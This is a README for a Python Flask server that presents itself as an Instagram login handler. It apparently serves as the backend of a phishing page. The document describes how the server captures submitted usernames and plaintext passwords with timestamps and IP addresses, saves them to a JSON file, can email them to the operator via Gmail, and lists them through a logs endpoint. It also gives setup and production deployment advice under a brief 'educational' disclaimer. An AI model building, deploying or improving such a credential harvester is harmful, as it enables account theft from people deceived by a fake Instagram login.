# Instagram Login Server - Python Version

This is a Python Flask server that handles Instagram login attempts without requiring authentication. It saves login credentials locally and optionally sends them via email.

## Features

- ✅ No authentication required
- ✅ Saves login attempts to local JSON file
- ✅ Optional email notifications
- ✅ CORS enabled for web access
- ✅ Simple setup and deployment

## Quick Start

### Option 1: Using the startup script (Recommended)
```bash
python run.py
```

### Option 2: Manual setup
```bash
# Install dependencies
pip install -r requirements.txt

# Start the server
python app.py
```

## Configuration

### Email Setup (Optional)
To receive email notifications, set these environment variables:

```bash
# Windows
set GMAIL_USER=your-email@gmail.com
set GMAIL_PASS=your-app-password

# Linux/Mac
export GMAIL_USER=your-email@gmail.com
export GMAIL_PASS=your-app-password
```

**Note:** For Gmail, you need to use an "App Password" instead of your regular password.

### Without Email
If you don't want email notifications, just run the server without setting the environment variables. Login attempts will still be saved locally.

## API Endpoints

- `POST /api/login` - Handle login attempts
- `GET /api/logs` - View all saved login attempts
- `POST /api/clear-logs` - Clear all saved login attempts

## Files Created

- `login_attempts.json` - Contains all login attempts with timestamps and IP addresses

## Example Login Data Structure

```json
[
  {
    "username": "test@example.com",
    "password": "password123",
    "timestamp": "2024-01-15T10:30:45.123456",
    "ip": "192.168.1.100"
  }
]
```

## Security Notes

- This server is designed for educational/testing purposes
- Login data is stored in plain text
- No encryption or security measures are implemented
- Use responsibly and in accordance with applicable laws

## Troubleshooting

### Port already in use
If port 5000 is already in use, modify the port in `app.py`:
```python
app.run(host='0.0.0.0', port=5001, debug=True)  # Change port number
```

### CORS issues
The server includes CORS headers, but if you have issues, you can modify the CORS settings in `app.py`.

### Email not sending
- Check your Gmail credentials
- Make sure you're using an App Password for Gmail
- Check your firewall/antivirus settings

## Deployment

For production deployment, consider:
- Using a proper WSGI server (Gunicorn, uWSGI)
- Setting up HTTPS
- Implementing proper logging
- Adding rate limiting
- Using environment variables for sensitive data 